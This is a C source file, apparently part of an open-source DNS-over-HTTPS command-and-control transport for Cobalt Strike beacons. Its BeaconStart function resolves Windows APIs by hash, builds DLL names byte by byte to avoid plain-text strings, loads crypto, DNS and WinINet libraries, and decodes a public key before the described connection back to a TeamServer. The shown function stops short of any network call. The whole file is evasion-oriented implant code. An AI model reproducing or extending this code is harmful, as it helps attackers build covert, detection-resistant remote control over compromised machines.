/*-
 *
 * extc2: open source dns over http(s)
 * transport for cs. does not use the
 * smb beacon.
 *
-*/

#include "common.h"

/*-
 *
 * BeaconStart
 *
 * Purpose:
 *
 * Implements the initial connection back
 * to the TeamServer. Then starts the IO
 * loop.
 *
 * The I-TLV configuration header must be
 * passed in as a parameter.
 *
-*/
DEFINESEC(B) VOID BeaconStart( PVOID Key, ULONG Len )
{
	BEACON_INSTANCE Ins = { 0 };
	UCHAR           Str[MAX_PATH];
	PVOID           Img;

	if ((Img = PebGetModule( H_KERNEL32 )) != NULL) 
	{
		Ins.api.LocalLock    = PeGetFuncEat( Img, H_LOCALLOCK );
		Ins.api.LocalFree    = PeGetFuncEat( Img, H_LOCALFREE );
		Ins.api.LocalSize    = PeGetFuncEat( Img, H_LOCALSIZE );
		Ins.api.LocalAlloc   = PeGetFuncEat( Img, H_LOCALALLOC );
		Ins.api.FreeLibrary  = PeGetFuncEat( Img, H_FREELIBRARY );
		Ins.api.LocalUnlock  = PeGetFuncEat( Img, H_LOCALUNLOCK );
		Ins.api.LocalReAlloc = PeGetFuncEat( Img, H_LOCALREALLOC );
		Ins.api.LoadLibraryA = PeGetFuncEat( Img, H_LOADLIBRARYA );

		Str[0x0] = 'c';
		Str[0x1] = 'r';
		Str[0x2] = 'y';
		Str[0x3] = 'p';
		Str[0x4] = 't';
		Str[0x5] = '3';
		Str[0x6] = '2';
		Str[0x7] = '.';
		Str[0x8] = 'd';
		Str[0x9] = 'l';
		Str[0xa] = 'l';
		Str[0xb] = 0x0;

		Ins.Module[0] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecodeObjectEx      = PeGetFuncEat( Ins.Module[0], H_CRYPTDECODEOBJECTEX );
		Ins.api.CryptImportPublicKeyInfo = PeGetFuncEat( Ins.Module[0], H_CRYPTIMPORTPUBLICKEYINFO );

		Str[0x0] = 'a';
		Str[0x1] = 'd';
		Str[0x2] = 'v';
		Str[0x3] = 'a';
		Str[0x4] = 'p';
		Str[0x5] = 'i';
		Str[0x6] = '3';
		Str[0x7] = '2';
		Str[0x8] = '.';
		Str[0x9] = 'd';
		Str[0xa] = 'l';
		Str[0xb] = 'l';
		Str[0xc] = 0x0;

		Ins.Module[1] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.CryptDecrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTDECRYPT );
		Ins.api.CryptEncrypt         = PeGetFuncEat( Ins.Module[1], H_CRYPTENCRYPT );
		Ins.api.CryptImportKey       = PeGetFuncEat( Ins.Module[1], H_CRYPTIMPORTKEY );
		Ins.api.CryptCreateHash      = PeGetFuncEat( Ins.Module[1], H_CRYPTCREATEHASH );
		Ins.api.CryptDestroyKey      = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYKEY );
		Ins.api.CryptDestroyHash     = PeGetFuncEat( Ins.Module[1], H_CRYPTDESTROYHASH );
		Ins.api.CryptSetKeyParam     = PeGetFuncEat( Ins.Module[1], H_CRYPTSETKEYPARAM );
		Ins.api.CryptReleaseContext  = PeGetFuncEat( Ins.Module[1], H_CRYPTRELEASECONTEXT );
		Ins.api.CryptAcquireContextA = PeGetFuncEat( Ins.Module[1], H_CRYPTACQUIRECONTEXTA );

		Str[0x0] = 'd';
		Str[0x1] = 'n';
		Str[0x2] = 's';
		Str[0x3] = 'a';
		Str[0x4] = 'p';
		Str[0x5] = 'i';
		Str[0x6] = '.';
		Str[0x7] = 'd';
		Str[0x8] = 'l';
		Str[0x9] = 'l';
		Str[0xa] = 0x0;

		Ins.Module[2] = Ins.api.LoadLibraryA( CPTR( Str ) );
		Ins.api.DnsWriteQuestionToBuffer_UTF8     = PeGetFuncEat( Ins.Module[2], H_DNSWRITEQUESTIONTOBUFFER_UTF8 );
		Ins.api.DnsExtractRecordsFromMessage_UTF8 = PeGetFuncEat( Ins.Module[2], H_DNSEXTRACTRECORDSFROMMESSAGE_UTF8 );

		Str[0x0] = 'w';
		Str[0x1] = 'i';
		Str[0x2] = 'n';
		Str[0x3] = 'i';
		Str[0x4] = 'n';
		Str[0x5] = 'e';
		Str[0x6] = 't';
		Str[0x7] = '.';
		Str[0x8] = 'd';
		Str[0x9] = 'l';
		Str[0xa] = 'l';
		Str[0xb] = 0x0;

		Ins.Module[3] = Ins.api.LoadLibraryA( CPTR( Str ) );

		if ( Ins.api.CryptDecodeObjectEx( 
				X509_ASN_ENCODING, 
				X509_PUBLIC_KEY_INFO, 
				Key,
				Len,
				CRYPT_DECODE_ALLOC_FLAG,
				NULL,
				&Ins.key[0].Ptr,
				&Ins.key[0].Len
				))
		{
			Ins.api.LocalFree( Ins.key[0].Ptr );
		};

		if ( Ins.Module[3] != NULL )
			Ins.api.FreeLibrary( Ins.Module[3] );

		if ( Ins.Module[2] != NULL )
			Ins.api.FreeLibrary( Ins.Module[2] );

		if ( Ins.Module[1] != NULL )
			Ins.api.FreeLibrary( Ins.Module[1] );

		if ( Ins.Module[0] != NULL )
			Ins.api.FreeLibrary( Ins.Module[0] );
	};

	__builtin_memset( &Ins, 0, sizeof( Ins ) );

	return;
};
